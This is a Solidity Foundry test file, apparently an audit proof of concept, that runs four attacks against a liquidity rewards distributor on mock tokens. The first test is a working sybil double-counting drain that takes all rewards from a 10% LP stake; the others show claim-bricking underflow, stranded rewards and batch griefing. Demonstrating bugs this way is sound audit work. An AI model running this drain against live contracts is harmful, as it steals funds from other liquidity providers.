// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/LiquidityRewardsDistributor.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LiquidityRewardsDistributorPoC is Test {
    MockERC20 lp;
    MockERC20 reward;
    LiquidityRewardsDistributor dist;

    address source = makeAddr("source");
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public {
        lp = new MockERC20();
        reward = new MockERC20();
        dist = new LiquidityRewardsDistributor(address(lp), address(reward));
        dist.configurePayoutOperator(source);

        reward.mint(source, 1_000_000e18);
        vm.prank(source);
        reward.approve(address(dist), type(uint256).max);
    }

    function _fund(uint256 amount) internal {
        vm.prank(source);
        dist.fundDistribution(amount);
    }

    /// Same LP is registered in N sybil accounts; each claims the full share.
    function test_doubleCountingDrain() public {
        lp.mint(alice, 90e18);
        lp.mint(attacker, 10e18);
        dist.refreshPosition(alice);

        uint256 n = 10;
        address[] memory sybils = new address[](n);
        address holder = attacker;
        for (uint256 i; i < n; i++) {
            sybils[i] = address(uint160(0x1000 + i));
            vm.prank(holder);
            lp.transfer(sybils[i], 10e18);
            dist.refreshPosition(sybils[i]);
            holder = sybils[i];
        }

        _fund(100e18);

        uint256 stolen;
        for (uint256 i; i < n; i++) {
            vm.prank(holder);
            lp.transfer(sybils[i], 10e18);
            stolen += dist.settleParticipant(sybils[i]);
            holder = sybils[i];
        }

        assertEq(stolen, 100e18, "10% LP holder took 100% of rewards");
        assertEq(reward.balanceOf(address(dist)), 0);

        vm.expectRevert();
        dist.redeemRewards();
    }

    /// LP balance decrease makes current - previous underflow; claims are bricked.
    function test_decreaseBricksClaims() public {
        lp.mint(alice, 100e18);
        dist.refreshPosition(alice);
        _fund(100e18);

        vm.prank(alice);
        lp.transfer(address(0xBEEF), 1);

        assertGt(dist.claimableAmount(alice), 0);
        vm.prank(alice);
        vm.expectRevert(stdError.arithmeticError);
        dist.redeemRewards();
    }

    /// A holder who did not refresh before funding loses the rewards forever.
    function test_unrefreshedHolderLosesRewards() public {
        lp.mint(alice, 100e18);
        _fund(100e18);

        assertEq(dist.claimableAmount(alice), 100e18, "view says 100");
        vm.prank(alice);
        vm.expectRevert(bytes("no dividend"));
        dist.redeemRewards();
        assertEq(reward.balanceOf(address(dist)), 100e18, "stuck forever");
    }

    /// One zero-claim account reverts the whole batch.
    function test_settleBatchGriefing() public {
        lp.mint(alice, 50e18);
        lp.mint(attacker, 50e18);
        dist.refreshPosition(alice);
        dist.refreshPosition(attacker);
        _fund(100e18);

        vm.prank(attacker);
        dist.redeemRewards();

        address[] memory accts = new address[](2);
        accts[0] = alice;
        accts[1] = attacker;
        vm.expectRevert(bytes("no dividend"));
        dist.settleBatch(accts);
    }
}
